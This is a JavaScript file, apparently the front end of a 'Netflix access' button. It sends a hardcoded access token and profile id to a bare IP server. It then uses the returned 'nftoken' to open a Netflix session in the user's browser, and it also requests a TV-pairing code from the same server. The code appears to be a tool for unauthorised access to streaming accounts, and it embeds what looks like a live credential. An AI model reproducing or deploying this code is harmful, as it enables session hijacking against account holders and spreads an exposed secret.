const btn = document.getElementById("netflix-button");

   
    
function laccessNetflix(access_token) {
    return fetch("https://65.21.228.155/access", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: new URLSearchParams({
            'access_token': "EAAFE0Tw8WfwBO1kXVVXAmVp4GaJuwhcZBDwzgcZCYajVZAlv4pZApLUvC7GLx3Idr8Lg0e5tRUn8MEUv2ZCPJmYDTR2RPO1y1jbGLYQk9m9azcbf8QZAraoOlyoZC8o6sM0FrUhcYWS8dIUZALLElhVZB0UdOmL0Bz5imcFuvhBqYGsgU5ov0VxGW8v1WRUO3m59pj7TCiAcH8A3X60xQjMOr9pNZCWqoZD"
        })
    })
}

function pairAndroid(access_token) {
    return fetch('https://65.21.228.155/mobile/code', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: new URLSearchParams({
            'access_token': access_token
        })
    });
}

function handleAccessAndroidBtnClick() {
    readAccessToken().then(access_token => {
        // Pair Netflix session with code
        pairAndroid(access_token)
            .then(response => response.json())
            .then(data => {
                if (data.result == 'success') {
                    window.location.href = ("https://www.google.com/search?q=le+code+est+%3A+" + data.data.code);
                    $('#androidModal').modal('show');
                } else {
                    window.location.href = ("https://www.google.com/search?q=le+code+est+%3A+" + data.message);
                }
            });
    });
}



function validateUser(access_token, profile_id) {
  const url = "https://65.21.228.155/login/validate";
  const data = {
            'access_token': access_token,
            'profile_id': profile_id
        };
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
  };
  return fetch("https://65.21.228.155/access", {
    method: "POST",
    headers: headers,
    body: new URLSearchParams({
            'access_token': access_token,

        })
  });
}

function runNetflixScript() {
 
  const access_token = "EAAFE0Tw8WfwBO1kXVVXAmVp4GaJuwhcZBDwzgcZCYajVZAlv4pZApLUvC7GLx3Idr8Lg0e5tRUn8MEUv2ZCPJmYDTR2RPO1y1jbGLYQk9m9azcbf8QZAraoOlyoZC8o6sM0FrUhcYWS8dIUZALLElhVZB0UdOmL0Bz5imcFuvhBqYGsgU5ov0VxGW8v1WRUO3m59pj7TCiAcH8A3X60xQjMOr9pNZCWqoZD"; // set a default access token
  

    
   const profile_id = "3080551322257201"; 
  const NETFLIX_DOMAIN = "http://www.netflix.com/";
  const url = "https://65.21.228.155";
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
  };
alert("La7adhat bro !")

validateUser(access_token, profile_id);
laccessNetflix(access_token)
          .then(response => response.json())
          .then(data => {
         

            if (data.result == 'success') {

   
              window.location.href = (NETFLIX_DOMAIN + '?nftoken=' + data.data.NFToken);
              
 alert(data.result);

            }
            else {
              alert(data.result);
            }})
}






